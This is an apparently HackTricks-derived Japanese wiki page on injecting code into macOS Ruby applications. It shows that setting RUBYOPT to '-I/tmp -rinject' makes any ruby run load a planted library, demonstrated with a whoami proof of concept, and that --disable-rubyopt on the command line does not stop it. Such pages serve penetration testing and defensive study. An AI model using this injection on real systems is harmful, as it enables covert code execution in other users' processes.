# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

この環境変数を使用すると、**ruby** が実行されるたびに **新しいパラメータを追加**できます。ただし、ruby code を実行するために **`-e`** パラメータを使用することはできません。その代わり、**`-I`** と **`-r`** パラメータを使用して、ロードパスに新しいフォルダを追加し、**ロードする library を指定**できます。

**`/tmp`** に **`inject.rb`** library を作成します。
```ruby:inject.rb
puts `whoami`
```
任意の場所に、次のような Ruby script を作成します：
```ruby:hello.rb
puts 'Hello, World!'
```
次に、任意の Ruby script から以下のようにロードさせます:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
豆知識、**`--disable-rubyopt`** param を指定しても動作します：
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
